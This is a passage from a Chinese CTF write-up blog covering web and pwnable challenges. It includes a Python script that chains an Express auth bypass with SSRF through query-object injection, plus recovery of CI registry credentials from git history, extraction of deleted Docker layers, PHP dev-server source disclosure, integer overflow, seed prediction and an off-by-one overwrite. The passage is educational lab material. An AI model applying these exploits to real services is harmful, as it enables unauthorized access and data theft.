}</code></pre><p>没错，原本的代码是有 <code>else</code> 分支的，<code>next()</code> 只有在认证成功的情况下才会被执行。现在变成了即使认证失败也只是把用户重定向到首页，但是后面的代码依然会被执行，只是 <code>res.end()</code> 失效导致用户拿不到执行结果罢了。</p><p>那么所有被 <code>restrict()</code> 中间件保护的接口就可以利用了，<code>/test</code> 接口具有发送 HTTP 请求的功能，我们或许可以利用它以 <code>127.0.0.1</code> 的身份访问 <code>/become_admin</code> 接口，然后化身管理员。</p><pre><code class="hljs javascript">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/test'</span>, restrict, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>){
  <span class="hljs-keyword">const</span> request = <span class="hljs-built_in">require</span>(<span class="hljs-string">'request'</span>).<span class="hljs-title function_">defaults</span>({<span class="hljs-attr">jar</span>: <span class="hljs-literal">true</span>});
  <span class="hljs-keyword">let</span> url = req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span>;
  <span class="hljs-keyword">if</span> (url) {
    <span class="hljs-title function_">request</span>(url, <span class="hljs-keyword">function</span> (<span class="hljs-params">error, response, body</span>) {
      res.<span class="hljs-title function_">end</span>(body);
    });
  } <span class="hljs-keyword">else</span> {
    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">'no url'</span>);
  }
});</code></pre><p>不过问题又来了，<code>/test</code> 接口请求的结果并不会返回给我们，因为在那之前我们已经被重定向了，我们又如何拿到 flag 呢？</p><p>我们可以在本地以访客身份登录一下拿到 Cookie，然后让 <code>request()</code> 带上我们的 Cookie 去请求 <code>/become_admin</code> 接口，等我们在远端成为管理员之后再用同一个 Cookie 从本地拿 flag 即可。</p><p>但是，我们能传给 <code>/test</code> 接口的参数只有一个 <code>url</code> 啊，如何给 <code>request()</code> 传递含 Cookie 的配置项呢？</p><p>如果仔细读过 Express.js 官方文档的话，你会在 <code>req.query</code> 这一节发现这样一个红框警告：</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_14f0c3b17d835d12bb4e6612becdf4ea.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_14f0c3b17d835d12bb4e6612becdf4ea.png?width=1920" srcset="/loading.gif" alt=""></p><p>（<a target="_blank" rel="noopener" href="https://expressjs.com/en/api.html#req.query">https://expressjs.com/en/api.html#req.query</a>）</p><p>没错，这就意味着我们传入的 <code>url</code> 何必只是一个 URL 字符串呢？我们完全可以传入一个 Object。而根据 <code>request</code> 库的官方文档，<code>request()</code> 的第一个参数既可以是 URL 字符串，也可以是一个含有各种配置项的 Object，正好符合利用条件。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_242415be02803cfadffbd7da56c99b29.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_242415be02803cfadffbd7da56c99b29.png?width=1920" srcset="/loading.gif" alt=""></p><p>（<a target="_blank" rel="noopener" href="https://github.com/request/request#requestoptions-callback">https://github.com/request/request#requestoptions-callback</a>）</p><p>按照上述步骤写个 Python 脚本跑一下即可。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

s = requests.Session()

args = {<span class="hljs-string">"username"</span>: <span class="hljs-string">"guest"</span>, <span class="hljs-string">"password"</span>: <span class="hljs-string">"guest"</span>}

url = <span class="hljs-string">"http://127.0.0.1:3000"</span>

r = s.post(url+<span class="hljs-string">"/login"</span>, data=args, allow_redirects=<span class="hljs-literal">False</span>)
sid = r.headers.get(<span class="hljs-string">"Set-Cookie"</span>).split(<span class="hljs-string">";"</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">"="</span>)[<span class="hljs-number">1</span>]

r = s.get(url+<span class="hljs-string">"/test"</span>,
          params={<span class="hljs-string">"url[uri]"</span>: <span class="hljs-string">"http://127.0.0.1:3000/become_admin"</span>, <span class="hljs-string">"url[method]"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"url[followAllRedirects]"</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">"url[headers][Cookie]"</span>: <span class="hljs-string">"connect.sid="</span>+sid, <span class="hljs-string">"url[jar]"</span>: <span class="hljs-literal">False</span>}, allow_redirects=<span class="hljs-literal">True</span>)
time.sleep(<span class="hljs-number">5</span>)

r = s.get(url+<span class="hljs-string">"/test"</span>,
          params={<span class="hljs-string">"url[uri]"</span>: url+<span class="hljs-string">"/"</span>, <span class="hljs-string">"url[method]"</span>: <span class="hljs-string">"GET"</span>, <span class="hljs-string">"url[headers][Cookie]"</span>: <span class="hljs-string">"connect.sid="</span>+sid, <span class="hljs-string">"url[jar]"</span>: <span class="hljs-literal">False</span>}, allow_redirects=<span class="hljs-literal">True</span>)

r = s.get(url+<span class="hljs-string">"/flag"</span>, allow_redirects=<span class="hljs-literal">True</span>)

<span class="hljs-built_in">print</span>(r.text)</code></pre><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ef9a3ee320e97444a3e24fb5bcd1730e.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ef9a3ee320e97444a3e24fb5bcd1730e.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="exsecurity_flag_p"><a class="markdownIt-Anchor" href="#exsecurity_flag_p"></a> exsecurity_flag_p</h3><p>我的 flag_p 是通过非预期做法拿到的，这里就讲一下题目修改之后正常的思考方式吧。</p><p>对目标机器做一下端口扫描，发现 8001 端口开着，直接访问拿到 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_dc364370d8bf7d349118e31e7509da9e.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_dc364370d8bf7d349118e31e7509da9e.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="exsecurity_flag_r"><a class="markdownIt-Anchor" href="#exsecurity_flag_r"></a> exsecurity_flag_r</h3><p>通过 <a target="_blank" rel="noopener" href="https://crt.sh">crt.sh</a> 检索这个域名所有的 SSL 证书，发现了一个子域名。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_e30081afb13ea053b2e83ebde9088dbf.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_e30081afb13ea053b2e83ebde9088dbf.png?width=1920" srcset="/loading.gif" alt=""></p><p>访问发现是 Harbor，结合之前具有争议的 CVE-2022-46463，尝试获取公开镜像，结果发现搜索功能不知道为啥 500 了。不过一番摸索后发现 Harbor API 是正常的，通过 <code>https://registry-intra-idc.exsecurity.top/api/v2.0/projects/</code> 拿到所有公开项目，再通过 <code>https://registry-intra-idc.exsecurity.top/api/v2.0/projects/flag_r/repositories/flag_r_a302102434b/artifacts</code> 拿到 <code>flag_r</code> 对应的构建产物信息，然后 <code>docker pull</code> 拉取即可。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_cb485c86788762e43565e5c112eb2f09.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_cb485c86788762e43565e5c112eb2f09.png?width=1920" srcset="/loading.gif" alt=""></p><p>拉取下来之后，创建容器，发现并没有 flag。看了眼构建过程发现先是添加了<code>flag.txt</code>然后又把它删了。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_85f674571a8326b76d304d4a369fe3cf.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_85f674571a8326b76d304d4a369fe3cf.png?width=1920" srcset="/loading.gif" alt=""></p><p>不过这一举动毫无意义，因为 Docker 镜像实际上是层状结构，每一个构建步骤都对应着一层，因此只要把含有 <code>flag.txt</code> 的那一层提取出来即可。通过 <code>docker save -o docker.tar.gz &lt;IMAGE_ID&gt;</code> 获得一个压缩包，里面含有每一层的信息，解压后找到了 <code>flag.txt</code>。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ea63fb673362aff2e0c9a63d6fa71a84.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ea63fb673362aff2e0c9a63d6fa71a84.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="exsecurity_flag_h"><a class="markdownIt-Anchor" href="#exsecurity_flag_h"></a> exsecurity_flag_h</h3><p>访问主页 <a target="_blank" rel="noopener" href="https://www.exsecurity.top/">https://www.exsecurity.top/</a>，按下 F12 看到 Hint。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ec2b68cc4b5c39d9c6b7bed1e7efa7f4.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ec2b68cc4b5c39d9c6b7bed1e7efa7f4.png?width=1920" srcset="/loading.gif" alt=""></p><p>同时我注意到这个网站居然使用的是 Parcel Development Server，哪个正经的生产环境会直接 <code>yarn start</code> 啊，不应该先打包编译出静态文件然后交给专门的生产服务器吗？</p><p>然后就在源代码选项卡看到了 <code>__parcel_source_root</code>，好家伙源代码直接爆出来了。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_be0f11e9e8ab7e1e478e846ee9537127.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_be0f11e9e8ab7e1e478e846ee9537127.png?width=1920" srcset="/loading.gif" alt=""></p><p>那么根据 Hint 访问 <code>https://www.exsecurity.top/__parcel_source_root/flag_h.txt</code> 即可。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_885ac1c4af011906fca6c5e2b231476f.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_885ac1c4af011906fca6c5e2b231476f.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="exsecurity_flag_s"><a class="markdownIt-Anchor" href="#exsecurity_flag_s"></a> exsecurity_flag_s</h3><p>在 exsecurity_flag_r 那道题发现了隐藏的 Harbor，当时只拉取了 <code>flag_r</code> 镜像，这次把 <code>homepage/corp</code> 镜像也拉下来看看有没有什么特别的地方。</p><p>构建历史里似乎没什么特别的，涉及到的 flag 也是 flag_h，那么在本地创建一个容器进去看看。注意到这个网页用的是一个开源项目，于是在 GitHub 上找到<a target="_blank" rel="noopener" href="https://github.com/cobiwave/simplefolio">原始的项目</a>，和容器内的文件进行了比对，发现只多了 <code>Dockerfile</code>、<code>flag_h.txt</code> 和 <code>.gitlab-ci.yml</code> 三个文件。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3709a3c82d968c960e451adbb55bc5d9.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3709a3c82d968c960e451adbb55bc5d9.png?width=1920" srcset="/loading.gif" alt=""></p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_c4ff647c728ad322a2a20e44831cc03d.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_c4ff647c728ad322a2a20e44831cc03d.png?width=1920" srcset="/loading.gif" alt=""></p><p>注意到镜像内保留了 <code>.git</code>，尝试 <code>git log</code> 了一下成功看到了 Git 日志。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_e9e97517e789f9e7f6e5a90af7f250aa.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_e9e97517e789f9e7f6e5a90af7f250aa.png?width=1920" srcset="/loading.gif" alt=""></p><p>似乎依然没啥特别的，就是在原始仓库的基础上多了两个 commit。但是如果你细看一下每个 commit 的文件改动记录，就能发现端倪。</p><p>我们看一下 <code>b7986a</code> 这个 commit 的详细信息：</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_e576bc677656f794246c083251d74d96.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_e576bc677656f794246c083251d74d96.png?width=1920" srcset="/loading.gif" alt=""></p><p>没错，从中我们可以看出 <code>.gitlab-ci.yml</code> 和 <code>Dockerfile</code> 这两个文件并不是在这个 commit 中才添加的，而是早就已经存在于这个镜像内的仓库中了，这与 GitHub 上的原始仓库并不一致。</p><p>那么自然就想到去看一看这两个文件究竟是什么时候被添加进来的。通过 Git 操作镜像内的仓库回退到了最初的版本，发现并没有这两个文件，说明是在中间某处被添加的，需要往近处再翻找一下，最后在 <code>f5d21b</code> 版本发现了问题。</p><p>通过 <code>git checkout f5d21b</code>，看一下此时的 <code>.gitlab-ci.yml</code>，果然看到了敏感信息，是供 CI 登录 Harbor 的账号密码。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ac49197f653b5062a90650e6a80d62a6.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ac49197f653b5062a90650e6a80d62a6.png?width=1920" srcset="/loading.gif" alt=""></p><p>那么拿着这个账号密码去 <code>https://registry-intra-idc.exsecurity.top/</code> 登录一下即可看到私有的 <code>flag_s</code>。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_a42ca1a2b39cc2bb4c3f5b9945ea7f82.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_a42ca1a2b39cc2bb4c3f5b9945ea7f82.png?width=1920" srcset="/loading.gif" alt=""></p><p>然后用和 flag_r 相同的办法拉取下来，提取出含有 <code>flag.txt</code> 的那一层即可。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_9023a1e8bed906f118f3fba005c7ab84.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_9023a1e8bed906f118f3fba005c7ab84.png?width=1920" srcset="/loading.gif" alt=""></p><p>（说起来这道题竟然只有我做出来了？！）</p><h3 id="baby-php"><a class="markdownIt-Anchor" href="#baby-php"></a> baby php</h3><p>直接给出了源代码，一看这怎么可能拿到 flag 嘛，想让 <code>1===0</code> 成立根本就不可能吧。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_4a1590580e576ec5bf9ccc8b3d99b049.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_4a1590580e576ec5bf9ccc8b3d99b049.png?width=1920" srcset="/loading.gif" alt=""></p><p>那么唯一的线索就是 PHPINFO 了，既然主动呈现给我们了那必有蹊跷。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_6a88a81de7a819bb0a533e36f05c1535.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_6a88a81de7a819bb0a533e36f05c1535.png?width=1920" srcset="/loading.gif" alt=""></p><p>果然，Server API 那一栏写的是 Built-in HTTP Server，说明这个站点用的是 PHP Development Server，又一个拿开发环境当生产环境的。结合 PHP 7.4.21 以及 PHP Development Server 作为关键词进行检索，发现了 <a target="_blank" rel="noopener" href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">PHP Development Server &lt;= 7.4.21 - Remote Source Disclosure</a> 这个漏洞。按照提供的 POC，使用 Burp Suite 复现一下即可拿到 <code>flag.php</code> 源代码。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_38c7804c6aaf4a9b1f5d5f5e181af569.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_38c7804c6aaf4a9b1f5d5f5e181af569.png?width=1920" srcset="/loading.gif" alt=""></p><p>（注意把 Update Content-Length 去掉）</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_4a913edecfe2712b3eaed52e86a84ef7.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_4a913edecfe2712b3eaed52e86a84ef7.png?width=1920" srcset="/loading.gif" alt=""></p><h2 id="pwnable"><a class="markdownIt-Anchor" href="#pwnable"></a> Pwnable</h2><h3 id="简单的rpg1"><a class="markdownIt-Anchor" href="#简单的rpg1"></a> 简单的RPG1</h3><p>显然无论选择1还是2都是死路一条，那么根据 <code>chall.c</code> 文件内 <code>stage1()</code> 函数中的这段代码</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
    choice = <span class="hljs-built_in">getchar</span>();
    <span class="hljs-keyword">if</span>((choice^(status*<span class="hljs-number">9</span>)^<span class="hljs-number">0x86</span>) == stage1key[status]){
        status++;
        <span class="hljs-keyword">if</span>(status==<span class="hljs-built_in">sizeof</span>(stage1key))<span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">else</span> status=<span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span>(choice == <span class="hljs-string">'1'</span> || choice == <span class="hljs-string">'2'</span>)<span class="hljs-keyword">break</span>;
}</code></pre><p>写个 C++ 程序爆破一下能够跳出这段循环的输入序列。</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> stage1key[] = {<span class="hljs-number">157</span>, <span class="hljs-number">212</span>, <span class="hljs-number">213</span>, <span class="hljs-number">134</span>, <span class="hljs-number">249</span>, <span class="hljs-number">234</span>, <span class="hljs-number">171</span>, <span class="hljs-number">226</span>, <span class="hljs-number">140</span>, <span class="hljs-number">204</span>,
                             <span class="hljs-number">135</span>, <span class="hljs-number">167</span>, <span class="hljs-number">241</span>, <span class="hljs-number">168</span>, <span class="hljs-number">188</span>, <span class="hljs-number">26</span>,  <span class="hljs-number">77</span>,  <span class="hljs-number">92</span>,  <span class="hljs-number">63</span>,  <span class="hljs-number">118</span>,
                             <span class="hljs-number">118</span>, <span class="hljs-number">32</span>,  <span class="hljs-number">27</span>,  <span class="hljs-number">10</span>,  <span class="hljs-number">60</span>,  <span class="hljs-number">6</span>,   <span class="hljs-number">14</span>,  <span class="hljs-number">20</span>};

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-type">char</span> choice;
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">sizeof</span>(stage1key); i++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> choice = <span class="hljs-number">0</span>; choice &lt;= <span class="hljs-number">255</span>; choice++) {
      <span class="hljs-keyword">if</span> ((choice ^ (i * <span class="hljs-number">9</span>) ^ <span class="hljs-number">0x86</span>) == stage1key[i]) {
        cout &lt;&lt; (<span class="hljs-type">int</span>)choice &lt;&lt; <span class="hljs-string">" "</span>;
        <span class="hljs-keyword">break</span>;
      }
    }
  }
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><p>得到正确的输入序列是 <code>27 91 65 27 91 65 27 91 66 27 91 66 27 91 68 27 91 67 27 91 68 27 91 67 98 97 98 97</code>，对照一下 ASCII 码表输入即可。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_84caf824f3705a0f7da36b2712568092.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_84caf824f3705a0f7da36b2712568092.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="简单的rpg2"><a class="markdownIt-Anchor" href="#简单的rpg2"></a> 简单的RPG2</h3><p>过关的条件是必须购买圣剑且力量&gt;10000，只有这么点钱根本就不可能做到嘛。</p><p>好在购买树枝的这段代码有点问题。</p><pre><code class="hljs cpp">num=<span class="hljs-built_in">atoi</span>(input_buff);
cost=num*<span class="hljs-number">50</span>;
<span class="hljs-built_in">setcursor</span>((windowX/<span class="hljs-number">5</span>)*<span class="hljs-number">3</span>+<span class="hljs-number">13</span>,windowY/<span class="hljs-number">2</span><span class="hljs-number">-10</span>);
<span class="hljs-keyword">if</span>(num&lt;=<span class="hljs-number">0</span> || cost &lt;=<span class="hljs-number">0</span>){
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"投机取巧是不行的哦"</span>);
}
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(money&lt;cost){
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"金钱不足"</span>);
}
<span class="hljs-keyword">else</span>{
    power+=num;
    money-=cost;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"获得了%d个树枝，好划算\n"</span>,num);
}</code></pre><p>只要我们输入一个足够大的正整数 <code>num</code> ，使得 <code>num*50</code> 超过 <code>int</code> 类型的上界发生溢出，且溢出很多使得 <code>cost</code> 依然为正但小于 <code>money</code>，那么就不会出现钱不够的情况，而且还获得了巨大的力量。</p><p>比如85899346就符合条件，购买圣剑之后再购买85899346个树枝，即可拿到 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_8f4a301b87be1e7a98a18aa2900c8af6.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_8f4a301b87be1e7a98a18aa2900c8af6.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="简单的rpg3"><a class="markdownIt-Anchor" href="#简单的rpg3"></a> 简单的RPG3</h3><p>第三关是个迷宫，不过每一步能不能似乎走对全靠运气，因为正确的方向是靠随机数生成的，每次都不一样，这可咋办？</p><p>不过看到 <code>srand(time(0)/10);</code> 瞬间就明白了，既然是拿当前的时间作为随机数种子，那么只要我保持本地时间和服务器时间一致，也拿同样的种子，即可预测生成的随机数序列，每一步该咋走也就清楚了。</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>) / <span class="hljs-number">10</span>);
  <span class="hljs-type">char</span> tab[<span class="hljs-number">4</span>] = {<span class="hljs-string">'W'</span>, <span class="hljs-string">'A'</span>, <span class="hljs-string">'S'</span>, <span class="hljs-string">'D'</span>};
  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) cout &lt;&lt; tab[<span class="hljs-built_in">rand</span>() % <span class="hljs-number">4</span>];
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><p>根据生成的序列走即可，注意手速要快，不能和服务器时间差太多，然后就拿到 flag 了。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_810d3332259721b5ed712d4b29766b21.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_810d3332259721b5ed712d4b29766b21.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="简单的rpg4"><a class="markdownIt-Anchor" href="#简单的rpg4"></a> 简单的RPG4</h3><p>这关开始不提供源代码了，不过拖进 IDA 逆向一下就可以了。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ee89f63ed6e347c4a70bd3dfb10a3c32.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ee89f63ed6e347c4a70bd3dfb10a3c32.png?width=1920" srcset="/loading.gif" alt=""></p><p>读了下伪代码发现本意是想让我们在 <code>your_deck/</code> 目录下选择一个怪兽和抓根宝战斗，然而都试了一遍发现 <code>your_deck/</code> 目录下提供给我们的怪兽都弱爆了，根本打不过。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_1283dfd6aff9ce446c7ba26e82c82d14.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_1283dfd6aff9ce446c7ba26e82c82d14.png?width=1920" srcset="/loading.gif" alt=""></p><p>不过没关系，自己的牌不好那就直接抢对手的牌，只需要召唤 <code>your_deck/.../opp_deck/Dragonmaid_Strahl</code> 就搞定了。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3488c0cd2ca3e7f15bdd4481bcf27ada.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3488c0cd2ca3e7f15bdd4481bcf27ada.png?width=1920" srcset="/loading.gif" alt=""></p><p>顺利拿到 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_1bfe700a85654932f02e0ec7783f2e40.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_1bfe700a85654932f02e0ec7783f2e40.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="简单的rpg5"><a class="markdownIt-Anchor" href="#简单的rpg5"></a> 简单的RPG5</h3><p>走迷宫，作为一个 ex-OIer 上来就是一个 DFS，然而根本搜不出路，看来是故意这样设计的，根本就到不了终点。</p><p>拖进 IDA 分析代码逻辑，发现确实是严格按照用户的输入一步一步走，判断是否撞墙，拿到 flag 的前置条件也确实必须走到终点，似乎找不到突破口。</p><p>仔细观察一下，发现我们的输入被 <code>scanf()</code> 限制了长度为512，存储到了 <code>byte_40C0[]</code> 这个数组里。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_9bf15c27ba73ed223594f8d183df675c.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_9bf15c27ba73ed223594f8d183df675c.png?width=1920" srcset="/loading.gif" alt=""></p><p>再看看 <code>getbit()</code> 函数的实现，发现迷宫的地图数据竟然也存储在 <code>byte_40C0[]</code> 这个数组，只不过是在后半部分，有一个512的偏移量。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_073af580677ee253d1ddcfb84962bf8c.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_073af580677ee253d1ddcfb84962bf8c.png?width=1920" srcset="/loading.gif" alt=""></p><p>这不就有机可乘了嘛。要知道 C 语言中读入一个长度为512的字符串，占用的空间可不是512而是513，因为最后一位是个 <code>\0</code>，代表字符串结束。这也就意味着如果我们输入的路径有512步，那么地图数据将被篡改，左上角的围墙会消失。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_de662e6f5b0737287b9a1358ad6c9914.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_de662e6f5b0737287b9a1358ad6c9914.png?width=1920" srcset="/loading.gif" alt=""></p><p>这就为我们打开了一条由 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 走向 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,7)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">7</span><span class="mclose">)</span></span></span></span> 的通路，跑了下 DFS 从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,7)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">7</span><span class="mclose">)</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>49</mn><mo separator="true">,</mo><mn>99</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(49,99)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord">4</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:.16666666666666666em"></span><span class="mord">9</span><span class="mord">9</span><span class="mclose">)</span></span></span></span> 是通的，找到了路径。于是我们只要把两段路连起来，再有意增加一些来回移动，把路径的长度凑够512即可。</p><pre><code class="hljs ebnf"><span 